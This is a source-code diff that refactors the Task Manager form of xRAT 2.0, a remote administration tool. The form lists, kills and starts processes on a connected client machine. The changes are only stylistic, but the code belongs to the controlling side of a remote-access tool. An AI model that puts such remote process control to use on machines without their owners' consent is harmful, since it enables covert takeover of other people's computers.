@@ -2,6 +2,7 @@
 using System.Windows.Forms;
 using xServer.Core;
 using xServer.Core.Misc;
+using xServer.Core.Packets.ServerPackets;
 
 namespace xServer.Forms
 {
@@ -16,7 +17,7 @@ namespace xServer.Forms
             _connectClient.Value.FrmTm = this;
 
             InitializeComponent();
-            
+
             _lvwColumnSorter = new ListViewColumnSorter();
             lstTasks.ListViewItemSorter = _lvwColumnSorter;
         }
@@ -25,8 +26,9 @@ namespace xServer.Forms
         {
             if (_connectClient != null)
             {
-                this.Text = string.Format("xRAT 2.0 - Task Manager [{0}:{1}]", _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
-                new Core.Packets.ServerPackets.GetProcesses().Execute(_connectClient);
+                Text = string.Format("xRAT 2.0 - Task Manager [{0}:{1}]", _connectClient.EndPoint.Address,
+                    _connectClient.EndPoint.Port);
+                new GetProcesses().Execute(_connectClient);
             }
         }
 
@@ -42,18 +44,18 @@ namespace xServer.Forms
             {
                 foreach (ListViewItem lvi in lstTasks.SelectedItems)
                 {
-                    new Core.Packets.ServerPackets.KillProcess(int.Parse(lvi.SubItems[1].Text)).Execute(_connectClient);
+                    new KillProcess(int.Parse(lvi.SubItems[1].Text)).Execute(_connectClient);
                 }
             }
         }
 
         private void ctxtStartProcess_Click(object sender, EventArgs e)
         {
-            string processname = string.Empty;
+            var processname = string.Empty;
             if (InputBox.Show("Processname", "Enter Processname:", ref processname) == DialogResult.OK)
             {
                 if (_connectClient != null)
-                    new Core.Packets.ServerPackets.StartProcess(processname).Execute(_connectClient);
+                    new StartProcess(processname).Execute(_connectClient);
             }
         }
 
@@ -61,7 +63,7 @@ namespace xServer.Forms
         {
             if (_connectClient != null)
             {
-                new Core.Packets.ServerPackets.GetProcesses().Execute(_connectClient);
+                new GetProcesses().Execute(_connectClient);
             }
         }
 
